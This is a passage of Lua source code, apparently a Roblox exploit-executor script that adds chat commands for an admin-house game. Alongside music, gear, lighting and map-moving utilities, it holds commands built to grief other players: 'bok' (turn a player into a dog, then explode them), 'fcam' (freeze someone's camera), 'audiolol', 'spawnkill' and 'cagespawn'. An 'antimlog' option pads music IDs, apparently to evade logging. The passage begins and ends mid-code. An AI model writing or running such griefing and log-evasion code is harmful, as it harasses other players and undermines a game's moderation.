                        musicplay = musicplay - 1
            end

            local mast = tostring(musicplay)

            if musicsay == true then
                Chat("h \n\n\n Playing music: " .. musictable[mast].name .. ". \n\n\n")
            end

            if antimlog then
                Chat("music 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" .. musictable[mast].id)
           else
                Chat("music " .. musictable[mast].id)
           end; ratelj = false
    end

    if string.sub(msg, 1, #prefix + 9)  == prefix..'musiclist' then
         Remind("Check your console by running /console!")
             local length = 0
             for _ in pairs(musictable) do
                length = length + 1
             end
         for i = 1, length do
                 q = tostring(i)
                  print("gmusic"..i.." - "..musictable[q].id.." - "..musictable[q].name)
         end
    end

  if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'theme' then		
		local themeNumber = tonumber(string.sub(msg:lower(), #prefix + 6))

		if themeNumber and themecode[tostring(themeNumber)] then
    			Chat("fix")
    			local codeParts = {}
    			for code in themecode[tostring(themeNumber)].code:gmatch("[^,]+") do
        			table.insert(codeParts, code)
    			end
    			for _, v in ipairs(codeParts) do
        			Chat(v)
    			end
		else
    			Remind("Invalid theme number. Please enter a number between 1 and 23.")
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'themelist' then
                Remind("Check your console by running /console!")
		for key, theme in pairs(themecode) do
    			print(key .. " - " .. theme.name .. " - " .. theme.code)
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'gear' then
             local args = string.split(msg, " ")
             if #args >= 3 then
                local target = args[2]
                local gearName = table.concat(args, " ", 3)
                local gearIDs = gearlist[gearName].gearid 
                if type(gearIDs) == "table" then
                            for _, selectedGearID in ipairs(gearIDs) do
                                Chat("gear " .. target .. " " .. selectedGearID)
                            end
                else
                            Chat("gear " .. target .. " " .. gearIDs)
                end
         end
    end

    if string.sub(msg, 1, #prefix + 8)  == prefix..'gearlist' then
         Remind("Check your console by running /console!")
         local sortedGearNames = {}
         for gearname, _ in pairs(gearlist) do
                    table.insert(sortedGearNames, gearname)
         end
         table.sort(sortedGearNames)
         for _, gearname in ipairs(sortedGearNames) do
                     local gearid = gearlist[gearname].gearid
                     if type(gearid) == "table" then
                        gearid = table.concat(gearid, ", ")
                     end
                    print(gearname .. " - IDS: " .. gearid)
         end
    end

   if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'char' then
        local args = string.split(msg, " ")
        if #args >= 3 then
                    local target = args[2]
                    local charName = table.concat(args, " ", 3)
                    local china = charlist[charName].charid
                Chat("char " .. target .. " " .. china)
        end
    end

    if string.sub(msg, 1, #prefix + 8)  == prefix..'charlist' then
         Remind("Check your console by running /console!")
         local sortedNames = {}
         for charname, _ in pairs(charlist) do
                    table.insert(sortedNames, charname)
         end
         table.sort(sortedNames)
         for _, charname in ipairs(sortedNames) do
                    print(charname .. " - IDS: " .. charlist[charname].charid)
         end
    end

   if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'turn' then
            local args = string.split(msg, " ")
            if #args >= 3 then
                local turner = args[3]
                local daturnings = turnlist[turner]
                if daturnings then
                            for i, code in ipairs(daturnings.name) do
                                    code = replaceArgs2(code, args[2])
                                    Chat(code)
                            end
                       else
                            Remind("Invalid turn (char) chosen.")
                end
            end
    end
		
-- SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND --
    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'pausem' then
       for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Folder:GetDescendants()) do
                  if v:IsA("Sound") and v.Playing then
                           v.Playing = false
                    end
       end
       Remind("Paused the music!")
    end
		
    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'playm' then
              for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Folder:GetDescendants()) do
                    if v:IsA("Sound") and not v.Playing then
                           v.Playing = true
                  end
              end
	      Remind("Playing the music!")
    end
-- SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND --
    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'stopm' then
        for i, v in pairs(game:GetService("Workspace").Terrain["_Game"].Folder:GetDescendants()) do
                if v:IsA("Sound") then
                    v:Stop()
                end
        end   
	Remind("Stopped the music!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'startm' then
        for i, v in pairs(game:GetService("Workspace").Terrain["_Game"].Folder:GetDescendants()) do
                if v:IsA("Sound") then
                    v:Play()
                end
        end   
        Remind("Started the music!")
    end
-- SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND SOUND --
    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'stops' then
        for i, v in pairs(game:GetDescendants()) do
                if v:IsA("Sound") then
                    v:Stop()
                end
        end   
	Remind("Stopped sounds!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'starts' then
        for i, v in pairs(game:GetDescendants()) do
                if v:IsA("Sound") then
                    v:Play()
                end
        end   
        Remind("Started sounds!")
    end
-- MOVING ON MOVING ON MOVING ON MOVING ON MOVING ON MOVING ON MOVING ON MOVING ON MOVING ON MOVING ON MOVING ON --
    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'deiv' then -- ported from simplekah
			gjdelock = false
                        Chat("h \n\n\n Domain Expansion: Infinity Void \n\n\n")
                        local deivfogend = 2000
                        local deivfog1 = 255
                        local deivfog2 = 255
                        local deivfog3 = 255
                        time = 7
                        for i = 1,100 do
                            task.wait(0.1)
                            deivfogend = deivfogend - 19
                            deivfog1 = deivfog1 - 2.55
                            deivfog2 = deivfog2 - 2.55
                            deivfog3 = deivfog3 - 2.55
                            time = time - 0.01
                            Chat("fogend " .. deivfogend)
                            Chat("fogcolor " .. deivfog1 .. " " .. deivfog2 .. " " .. deivfog3)
                            Chat("time " .. time)
			    if gjdelock == "stop" then
					return 
			    end
                        end
			if gjdelock ~= "stop" then
                        	gjdelock = true
                        	Chat("h \n\n\n You have entered my domain so please wait until I decide to close it... \n\n\n")
			end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'undeiv' then  -- ported from simplekah
                        Chat("fix")
                        Chat("reload all")
                        gjdelock = "stop"
			Remind("Turned off DEIV.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'tropics' then  -- ported from simplekah
                     local tropfogend = 0
                     local tropfogcolor = 0
                     local tropfogcolor2 = 0
                     local tropfogcolor3 = 200
                     local time = 10
                     Chat("h \n\n\n Red glow... \n\n\n")
                     Chat("fogcolor 200 0 0")
                     Chat("outdoorambient 0 0 0")
                     Chat("time " .. time)
                     for i = 1,10 do
                            task.wait(0.2)
                            tropfogend = tropfogend + 100
                            Chat("fogend " .. tropfogend)
                     end
                     Chat("h \n\n\n Blue glow... \n\n\n")
                     for i = 1,10 do
                            task.wait(0.3)
                            time = time - 0.4
                            Chat("time " .. time)
                            tropfogend = tropfogend - 50
                            Chat("fogend " .. tropfogend)
                            tropfogcolor = tropfogcolor + 20
                            Chat("fogcolor " .. "200 " .. "0 " .. tropfogcolor)
                     end
                     Chat("h \n\n\n Hollow purple! \n\n\n")
                        Chat("speed others inf")
                     for i = 1,10 do
                            task.wait(0.2)
                            tropfogcolor3 = tropfogcolor3 + 5.5
                            tropfogcolor = tropfogcolor + 5.5
                            tropfogcolor2 = tropfogcolor2 + 25.5
                            tropfogend = tropfogend + 150
                            time = time + 0.1
                            Chat("fogcolor " .. tropfogcolor3 .. " " .. tropfogcolor2 .. " " .. tropfogcolor)
                            Chat("fogend " .. tropfogend)
                            Chat("time " .. time)
                    end
                    Chat("fix")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'sclr' then -- super clr fix everything (ffix does everything to yourself)
                Chat("fix")
                Chat("clr")
                Chat("removeclones")
                Chat("removejails")
		Chat(prefix.."fixpaint")
		Chat("reload all")
		Remind("Cleaned the server.") 
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'volm' then -- rap e
               local newVolume = tonumber(string.sub(msg:lower(), #prefix + 6))
               if newVolume ~= nil and game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                          game:GetService("Workspace").Terrain["_Game"].Folder.Sound.Volume = newVolume
               end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'musicid' then
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                              print("Current music ID: "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.SoundId)
                              Remind("Current music ID: "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.SoundId)
              end
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'cmusicid' then
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
				Remind("Copied the music id to your clipboard.")
                                local url = game:GetService("Workspace").Terrain["_Game"].Folder.Sound.SoundId
                                local number = url:match("id=(%d+)")
                                setclipboard(number)
              end
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'audiolog' then
		Loops.alog = true
		Remind("The audiolog will save to your workspace.")
   end

   if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unaudiolog' then
		Loops.alog = false
		Remind("Switched off the audiolog.")
   end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cvol' then
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                              Remind("Current volume: "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.Volume)
              end        
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'timepos' then
              local tplace = tonumber(string.sub(msg:lower(), #prefix + 9))
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                        game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimePosition = tplace 
              end        
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'timeis' then
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                        Remind("Current time position: "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimePosition)
              end        
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'timedur' then
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                        Remind("Time length: "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimeLength)
              end        
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'timeps' then
              if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                        Remind("The playback speed is: "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackSpeed)
              end        
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'timeplay' then
             newPlaybackSpeed = tonumber(string.sub(msg:lower(), #prefix + 10))
             local Sound = game:GetService("Workspace").Terrain["_Game"].Folder.Sound
             Sound.PlaybackSpeed = newPlaybackSpeed
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'audiolol' then
       audiotroll = true
	Remind("Listen to the audio now...")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unaudiolol' then
       audiotroll = false
	Remind("Stopped messing up the audio!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antimusic' then
       mymusiconly = false
       antimusic = true
	Remind("Anti music is on! Do 'pmu (NO ID AFTER IT!!)' if this command doesn't work well")
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantimusic' then
       antimusic = false
	Remind("Turned anti music off!")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'pmu' then
	if not string.sub(msg:lower(), 1, #prefix + 4) == prefix..'pmu2' then
        	musicoff = false
        	mymusiconly = true
        	gottenmode = 2
        	mymusiconlyid = tonumber(string.sub(msg:lower(), #prefix + 5))
        	Remind("Perm music is on")
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'2pmu' then
        if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                                local url = game:GetService("Workspace").Terrain["_Game"].Folder.Sound.SoundId
                                local number = url:match("id=(%d+)")
                                gottenmode = 1
                                musicoff = false
                                mymusiconly = true
                                mymusiconlyid = number
                                Remind("Perm music is on (set to current id)")
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'bring' then
        bringu = (string.sub(msg:lower(), #prefix + 7))
        Bring()
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'goto' then
        gotou = (string.sub(msg:lower(), #prefix + 6))
        Goto()
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'song' then -- bit buggy if you stop the music but keep the playlist open
             local args = string.split(msg, " ")
             if #args == 2 then
                local shazam = args[2]
                Playlist(shazam)
		Remind("Playlist starting.")
         end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'ssong' then
                SkipEvent:Fire()
		Remind("Skipped song.")
    end
                
    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'esong' then
                StopEvent:Fire()
		Remind("Ended playlist.")
    end
                
    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'ggear' then
        local args = string.split(msg, " ")
        if #args >= 3 then
            local target = args[2]
            local gearName = table.concat(args, " ", 3)
            local keyword = game:GetService("HttpService"):UrlEncode(gearName)
            local GearsJSON = game:HttpGet("https://catalog.roblox.com/v1/search/items?category=All&includeNotForSale=true&keyword="..keyword.."&limit=120")
            local GearsDecoded = game:GetService("HttpService"):JSONDecode(GearsJSON)
            if GearsDecoded and GearsDecoded.data then
                for _,v in pairs(GearsDecoded.data) do
                --    print(v.id)
                    local Asset
                    local AssetOk, E = pcall(function() Asset = game:GetService("MarketplaceService"):GetProductInfo(v.id) end)
                    if AssetOk then
                        if Asset.AssetTypeId == Enum.AssetType.Gear.Value then
                            Chat("gear " .. target .. " " .. v.id)
                        end
                    end
                end
            end 
        else
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'gchar' then -- tech added this command to scv3-var :)
        local args = string.split(msg, " ")
        local target = args[2]
        local specialid = table.concat(args, " ", 3)
        local charpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        local circus = game.Players:GetUserIdFromNameAsync(specialid)
        Chat("char " .. target .. " " .. circus);task.wait(0.5)
        if target == "me" then -- it tps you back to your old position if you state that you're the person to have the char done
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = charpos
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antiabuse' then
        Remind("WIP")

    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantiabuse' then
        Remind("WIP")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'bok' then
          bokme = (string.sub(msg:lower(), #prefix + 5))
          SuperCMD("dog "..bokme)
          task.wait(1)
          Chat("explode "..bokme)
	  Remind("Boked the player!")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'cgoto' then
           local dasplayer = string.sub(msg:lower(), #prefix + 7)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                gotou = cplr
                Goto2(gotou)
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'fixbp' then
	if not string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fixbp2' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                moveobject(game.Workspace.Terrain["_Game"].Workspace["Baseplate"], 2)
                repeat fwait() until movestatus == false
                GravFix()
                Chat("respawn me")
                ColFix()
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'movebp' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                moveobject(game.Workspace.Terrain["_Game"].Workspace["Baseplate"], 1)
                repeat fwait() until movestatus == false
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'spawnkill' then
                        moveObject(game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump9,CFrame.new(-41.0650024, 1.30000007, -28.601058959961, 0, 0, -1, 0, 1, 0, 1, 0, 0))
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'cagespawn' then
                    moveObject(game:GetService("Workspace").Terrain["_Game"].Workspace["Basic House"].SmoothBlockModel40,CFrame.new(-10.7921638, 17.3182983, -16.0743637, -0.999961913, -0.0085983118, 0.00151610479, -1.01120179e-08, 0.173648253, 0.98480773, -0.00873095356, 0.984770179, -0.173641637))
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fixpads2' then
        local adminPadCFrames = {CFrame.new(-40.7649879, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-36.7649803, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-32.7649765, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-20.7649632, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-44.7649994, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-12.7649641, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-28.7649689, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-16.7649612, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-24.764967, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)}
            for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
                moveObject(v.Head,adminPadCFrames[i]*CFrame.new(0,4,0))
                task.wait(0.25)
            end    
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'fixregen2' then
                    moveObject(game:GetService("Workspace").Terrain["_Game"].Admin.Regen,CFrame.new(-7.16500044, 5.42999268, 91.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0))
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fixbp2' then
                    moveObject(workspace.Terrain["_Game"].Workspace.Baseplate,CFrame.new(-501, 0.100000001, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'fcam' then
		local dasplayer = string.sub(msg:lower(), #prefix + 6)
                PLAYERCHECK(dasplayer)
                if player ~= nil then
                        FCAM(cplr, player)
			Remind("Freezing the person's camera...")
        
                else                        
                        Remind('Cannot find player with the name: '..dasplayer)
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fixspawn' then
                if movestatus == true then 
                        return 
                end        
                DisCol()
                if Map:FindFirstChild("Spawn1") then
                        moveobject(Map:FindFirstChild("Spawn1"), 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                task.wait(1)
                if Map:FindFirstChild("Spawn2") then
                        moveobject(Map:FindFirstChild("Spawn2"), 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                task.wait(1)
                if Map:FindFirstChild("Spawn3") then
                        moveobject(Map:FindFirstChild("Spawn3"), 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'movespawn' then
                if movestatus == true then 
                        return 
                end        
                DisCol()
                if Map:FindFirstChild("Spawn1") then
                        moveobject(Map:FindFirstChild("Spawn1"), 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                task.wait(1)
                if Map:FindFirstChild("Spawn2") then
                        moveobject(Map:FindFirstChild("Spawn2"), 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                task.wait(1)
                if Map:FindFirstChild("Spawn3") then
                        moveobject(Map:FindFirstChild("Spawn3"), 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fixregen' then
	if not string.sub(msg:lower(), 1, #prefix + 9) == prefix..'fixregen2' then

                if movestatus == true then 
                        return 
                end
                DisCol()
                moveobject(Admin.Regen, 2)
                repeat fwait() until movestatus == false
                GravFix()
                Chat("respawn me")
                ColFix()
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'ivmove' then
			yeahthemover("yes")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'omove' then
			yeahthemover("no")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'moveregen' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                moveobject(Admin.Regen, 1)
                repeat fwait() until movestatus == false
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'saveregen' then
                Remind("Keep your regen co-ords safe!")
                adx, ady, adz = Admin.Regen.Position.X, Admin.Regen.Position.Y, Admin.Regen.Position.Z
                q = adx .. ady .. adz
                print(Admin.Regen.Position.X, Admin.Regen.Position.Y, Admin.Regen.Position.Z)
                setclipboard(q)
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'cusername' then
 		local dasplayer = string.sub(msg:lower(), #prefix + 11)
                PLAYERCHECK(dasplayer)
                if player ~= nil then
        		su = player
			setclipboard(su)
			Remind("Successfully copied the player's username to clipboard.")
                else                        
                        Remind('Cannot find player with the name: '..dasplayer)
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fixpads' then    
	if not string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fixpads2' then

                if movestatus == true then 
                        return 
                end        
                for i,v in pairs(Pads) do
                        if allclear() == false then break end
                        if v:FindFirstChildOfClass("Part") then
                                v:FindFirstChildOfClass("Part").Name = "Pad" .. tostring(i)
                        end
                end
                DisCol()
                for i,v in ipairs(Pads) do
                        if allclear() == false then break end
                        if v:FindFirstChildOfClass("Part") then
                                v:FindFirstChildOfClass("Part").CanCollide = true
                                moveobject(v:FindFirstChildOfClass("Part"), 2)
                                repeat fwait() until movestatus == false
                                Chat("respawn me")
                                v:FindFirstChildOfClass("Part").CanCollide = false
                        end
                end
                GravFix()
                Chat("respawn me")
                ColFix()
	end
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'movepads' then        
                if movestatus == true then 
                        return 
                end        
                DisCol()
                for i,v in ipairs(Pads) do
                        if allclear() == false then break end
                        if v:FindFirstChildOfClass("Part") then
                                v:FindFirstChildOfClass("Part").CanCollide = true
                                moveobject(v:FindFirstChildOfClass("Part"), 1)
                                repeat fwait() until movestatus == false
                                Chat("respawn me")
                                v:FindFirstChildOfClass("Part").CanCollide = false
                        end
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'fixfl' then        
                if movestatus == true then 
                        return 
                end        
                DisCol()
                if game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel38") then
                        moveobject(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel38"), 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                if game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel40") then
                        moveobject(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel40"), 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                if game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel112") then
                        moveobject(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel112"), 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'movefl' then        
                if movestatus == true then 
                        return 
                end        
                DisCol()
                if game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel38") then
                        moveobject(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel38"), 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                if game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel40") then
                        moveobject(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel40"), 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                if game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel112") then
                        moveobject(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel112"), 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fixobby' then
                Chat(prefix.."tnok")
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(workspace.Terrain._Game.Workspace["Obby Box"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'moveobby' then
                Chat(prefix.."tnok")
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(workspace.Terrain._Game.Workspace["Obby Box"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'fixkb' then
                Chat(prefix.."tnok")
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'movekb' then
                Chat(prefix.."tnok")
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fixobox' then
                Chat(prefix.."tnok")
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(workspace.Terrain._Game.Workspace["Obby Box"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'moveobox' then
                Chat(prefix.."tnok")
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(workspace.Terrain._Game.Workspace["Obby Box"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

  if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fixadv' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

  if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'moveadv' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

  if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fixhouse' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

  if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'movehouse' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

  if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'fixbb' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetChildren()) do
                        if allclear() == false then break end
